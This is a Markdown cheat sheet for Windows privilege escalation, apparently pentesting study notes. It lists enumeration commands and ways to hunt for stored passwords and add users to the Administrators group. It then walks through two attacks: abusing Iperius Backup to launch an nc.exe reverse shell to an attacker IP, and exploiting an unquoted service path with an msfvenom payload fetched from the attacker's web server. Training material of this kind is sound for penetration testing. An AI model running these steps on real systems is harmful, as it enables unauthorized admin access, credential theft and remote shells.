---
title: Windows PrivEsc
desc: Checklist for Privilege Escalation on Windows.
tags: [PowerShell, PrivEsc, Windows]
alts: [ADCSPrivEsc, WinPEAS]
website:
render_with_liquid: false
---

## Useful Commands on Command Prompt

```powershell
# Hostname
hostname
# System information
systeminfo
systeminfo | findstr "OS"
# Version
ver

# Current user
whoami
whoami /user
whoami /groups
whoami /priv
whoami /all
echo %username%

# List all users
net users
# Specific user info
net user USERNAME
# List all groups
net localgroup

# Change user's password
net user USERNAME NEWPASSWORD
# Add new user
net user /add USERNAME PASSWORD
# Add user to group
net localgroup Administrators USERNAME /add
net localgroup "Remote Managment Users" USERNAME /add
net localgroup "Remote Desktop Users" USERNAME /add
# Then you can execute "win-rm" or "xfreerdp" with credentials

# Processes and services
sc query state=all
tasklist /svc

# Network
ipconfig
ipconfig /all
print route
arp -A

# Firewall
netsh firewall show state
netsh firewall show config
netsh advfirewall show allprofiles

# Find sensitive data
findstr /si password *.txt *.xml *.ini
findstr /si cred *.txt *.xml *.ini
findstr /spin "password" *.*
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *.config*
reg query HKLM /f password /t REG_SZ /s

# Get services running
wmic service list
wmic service list | findstr "Backup"
wmic service list | findstr "Iperius"  # Iperius is a backup service
# List all Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                              "
# Get target process info
wmic process get processid,parentprocessid,executablepath | find "<process-id>"
# Get users SID
wmic useraccount get name,sid
# Launch the hidden executable hiding within ADS
wmic process call create $(Resolve-Path .\file.exe:streamname)

# Check Recycle.bin and SID Folder
cd \'$Recycle.bin'
cd \'$Recycle.bin\S-1-5-21-198...334-1001'

# Interect with VSS (The Volume Shadow Copy Service)
vssadmin
vssadmin list shadows
vssadmin list volumes

# List files - all
dir /a \Users\Administrator\Desktop
# List files - display the owner of the file or folder
dir /q \Users\Administrator\Desktop

# Get contents of file
more .\example.txt
type .\example.txt

# Edit file
notepad .\example.txt
edit .\example.txt
nano .\example.txt
vim .\example.txt
vi .\example.txt

# Move file
move .\example.txt ..\Desktop\

# Change permission of a file
icacls 'C:\Path\to\file' /grant Users:F
icacls 'C:\Path\to\file' /grant Everyone:F

# Query the configuration info for a specified service
sc qc "Development Service"


# Restart machine
shutdown /r /t 0
```

<br />

## Take Ownership of a File (Administrators Group Required)

```powershell
# Move to the directory containing the desired file
cd \Users\Administrator\Desktop

# Enable an administrator to recover access to a file.
# /R: recursive operation
# /F: specify the filename
takeown /r /f *.*

# Modify dictionary access control lists on specified files
# /q: suppress success message
# /c: continue the operation despite any file errors
# /t: perform the operation on all specified files
# /grant: grant specified user access rights
icacls "example.txt" /q /c /t /grant Users:F
```

<br />

## Computer Management

You can find all local users.

```
1. Search and open "computer management".
2. Click "Local Users and Groups".

<Users>
1. Click "Users".
2. Double-click each user to get details e.g. "Member Of".

<Groups>
1. Click "Groups".
2. Double-click each group.
3. Attempt to add new user in the group. In most cases, however, it should do as administrator.
```

<br />

## Disk Management

### Check partitions

```sh
1. Open the 'Disk Management'.
2. Right click the partition to view the properties.
3. Check 'Security' tab or 'Shadow Copies' tab.

# To see the pertion in Windows Explorer
1. Right click the partition and click 'Change Drive Letter and Paths'
2. Open dialog.
3. Click 'Add'. In the dropdown, choose a letter (ex. Z:) and click 'OK'.
4. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to.
5. Open Windows Explorer and check if Z: exists on 'This PC'.
6. Click the partition (Z:) and click 'View' tab at the top then check 'Hidden Items'.

# Restore the previous version of partition
1. Right click the partition and click 'Properties' -> 'Previous Versions'.
2. Select shadow copy you want to restore and click 'Restore'. The Confirmation popup open, then click 'Restore'.
```

<br />

## Event Viewer

It lets administrators and users view the event logs on a local or remote machine.

```
1. Search and open "Event Viewer".
```

<br />

## FullEventLogview

```sh
# Search event logs
1. Open "Advanced Options".
```

<br />

## Sysinternals

Tools that offer technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment.

```sh
# Autoruns
# It shows what programs are configured to run during system bootup or login.
autoruns.exe

# Process Explorer
# A freeware task manager and system monitor.
procexp.exe
procexp64.exe

# Process Monitor
# It monitors and displays in real-time all file system activity.
procmon.exe
procmon64.exe

# Strings
# It is same as the Linux “strings” command.
strings.exe example.exe | findstr "sometext"
strings64.exe example.exe | findstr "sometext"
```

<br />

## Task Scheduler

<br />

## Iperius Backup Service (Privilege Escalation)

Iperius is vulnerable to privilege escalation.

```sh
# On target windows machine

# Check if Iperius is running
wmic service list | findstr "Iperius"

# Create a .bat file (ex. "exploit.bat") and place it to Desktop.
# When saving, be sure to save it as the file type "All Files". (NOT Text Documents (*.txt))
@echo off
C:\Users\<USERNAME>\Downloads\nc.exe <attack_machine_ip> 1337 -e exploit.exe


# ----------------------------------------------------------

# On attack machine

# Open listener...
nc -lvnp 1337

# ----------------------------------------------------------

# On target windows machine

# Settings
1. Click "Iperius" icon in Windows Explorer (path: C:\Program Files (x86)\Iperius Backup\Iperius).
2. Right click the "Iperius" icon on the right-bottom of the bar to open it.
3. Click "Create New Backup" and select "Add Folder".
4. Enter path (c:\Users\<USERNAME>\Documents) and click "OK".
5. Navigate to "Destination" tab and select "Add Destination Folder".
7. Enter path (c:\Users\<USERNAME>\Descktop) and click "OK".
8. Navigate to "Other Processes" tab.
9. On "Before backup" section, check "Run a program or open external file:" and select "exploit.bat" file.

# Run 
On "Iperius Backup" window, right-click on backup jobs "Documents" and select "Run backup as service" then click "OK" on the dialog.


# -----------------------------------------------------

# On attack machine
Now you should see an incoming connection.
```

<br />

## Unquoted Service Path to Privilege Escalation

```powershell

# In victim Windows machine

# Find unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                                "

# Confirm the information for the service
sc qc "Development Service"

# If the service path is "C:\Program Files\Development Files\Devservice Files\Service.exe",
# you can place the exploit to "C:\Program Files\Devservice.exe"

# -----------------------------------------------------------------

# In attack machine

# Create the exploit using msfvenom
msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe

# Start local web server
python3 -m http.server 8000

# -------------------------------------------------------------

# In victim Windows machine

# Start PowerShell
powershell
# Wget
Invoke-WebRequest -Uri http://<attack-ip>:8000/Devservice.exe -OutFile .\Devservice.exe
# Move the exploit to the target path
mv .\Devservice.exe '\Program Files\Development Files\'

# Change permission of the exploit
icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F

# Restart
shutdown /r /t 0
# or PowerShell's command
Restart-Computer
```